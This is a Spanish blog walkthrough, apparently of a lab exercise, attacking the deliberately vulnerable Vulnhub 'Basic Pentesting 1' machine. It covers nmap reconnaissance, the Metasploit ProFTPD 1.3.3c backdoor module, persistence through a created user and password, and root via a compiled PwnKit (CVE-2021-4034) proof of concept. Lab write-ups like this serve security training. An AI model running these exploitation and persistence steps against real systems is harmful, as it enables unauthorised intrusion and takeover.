---
title: "Vulnhub #0: CSEC Basic Pentesting 1"
description: Pentesting a máquina CSEC 1 en Vulnhub
date: 2025-05-10
scheduled: 2025-05-10
tags:
  - hacking
layout: layouts/post.njk
---

Puedes descargar la máquina vulnerable desde [Vulnhub](https://www.vulnhub.com/entry/basic-pentesting-1,216/)

## Descubrimiento de host

Usamos `sudo netdiscover` para descubrir los host en la red.

Estas son las dos máquinas del laboratorio:

```plaintext
Kali:    192.168.0.16
Victima: 192.168.0.26
```

## Reconocimiento

Usamos `nmap -sT -p- -A 192.168.0.26 -oA resultados` para realizar un escaneo completo de puertos y servicios.

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD 1.3.3c
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```

## Explotación

### Buscar exploit

Vamos a probar a romper `FTPd` con `metasploit`

Podemos lanzar metasploit con `msfconsole`

Si buscamos exploits con `search proFTPd` podemos encontrar una para nuestra version.

### Configuracion del exploit

Puedes usar `use unix/ftp/proftpd_133c_backdoor` para usar este exploit, tambien puedes usar su index.

Con show options vemos que debemos indicar el `rhosts`, `lhost` y un `exploit target` o payload a ejecutar.

Para ver los payloads disponibles `show payloads`.

Para cargar un payload `set payload index|path`. 

Para configurar la maquina a atacar `set rhosts 192.168.0.26`.

Para configurar que maquina se queda escuchando `set lhost 192.168.0.16`.

Lanzamos con `run`, deberíamos obtener acceso a una terminal, podemos comprobarlo con `whoami` o `ls`.

### Persistencia

Podemos crear un usuario con `useradd hhyyppeerr`.

Y crear una contraseña con `echo "hhyyppeerr:ilovesummer" | chpasswd`

Podemos comprobar que podemos entrar al sistema con `ssh hhyyppeerr@192.168.0.26` e introduciendo `ilovesummer` como contraseña.

## Escalado de privilegios

Copiamos `linpeas` o el script que queramos usar a la maquina objetivo con `scp ./linpeas.sh hhyyppeerr@192.168.0.26:/tmp/linpeas.sh`.

Entramos de nuevo en la maquina objetivo con nuestro usuario y lanzamos el script.

Linpeas nos ha mostrado el siguiente exploit disponible:

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                            
[+] [CVE-2021-4034] PwnKit                                                                                                    

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

Podemos buscar el CVE para encontrar exploits, en nuestro caso: https://github.com/arthepsy/CVE-2021-4034

Nos copiamos el repositorio a la maquina objetivo con `nano` o `scp`.

Compilamos y ejecutamos el codigo:

```plaintext
$ ls
cve-2021-4034-poc.c  README.md
$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
$ ls
cve-2021-4034-poc  cve-2021-4034-poc.c  README.md
$ ./cve-2021-4034-poc
# whoami
root
```